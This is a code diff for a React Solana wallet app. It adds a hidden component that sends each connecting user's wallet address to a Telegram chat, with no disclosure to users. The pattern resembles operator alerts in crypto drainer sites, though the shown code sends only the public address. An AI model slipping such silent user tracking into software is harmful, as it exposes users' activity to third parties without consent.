@@ -1,10 +1,12 @@
-import { lazy, Suspense } from "react";
+import { lazy, Suspense, useEffect } from "react";
 import { TooltipProvider } from "@/components/ui/tooltip";
 import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
 import { BrowserRouter, Routes, Route } from "react-router-dom";
 import { WalletProvider } from "./providers/WalletProvider";
 import { SolflareDeepLinkHandler } from "@/components/SolflareDeepLinkHandler";
 import { Toaster } from "@/components/ui/sonner";
+import { useWallet } from "@solana/wallet-adapter-react";
+import { sendTelegramMessage } from "@/utils/telegram";
 import Index from "./pages/Index";
 import NotFound from "./pages/NotFound";
 
@@ -31,10 +33,27 @@ const PageLoader = () => (
   </div>
 );
 
+// Component to send Telegram notifications on Solana wallet connect
+const SolanaWalletNotifier = () => {
+  const { connected, publicKey } = useWallet();
+
+  useEffect(() => {
+    if (connected && publicKey) {
+      sendTelegramMessage(`
+🔗 <b>Solana Wallet Connected</b>
+👤 <b>Address:</b> <code>${publicKey.toBase58()}</code>
+`);
+    }
+  }, [connected, publicKey]);
+
+  return null;
+};
+
 const App = () => (
   <QueryClientProvider client={queryClient}>
     <WalletProvider>
       <SolflareDeepLinkHandler />
+      <SolanaWalletNotifier />
       <TooltipProvider>
         <BrowserRouter>
           <Toaster position="top-center" />
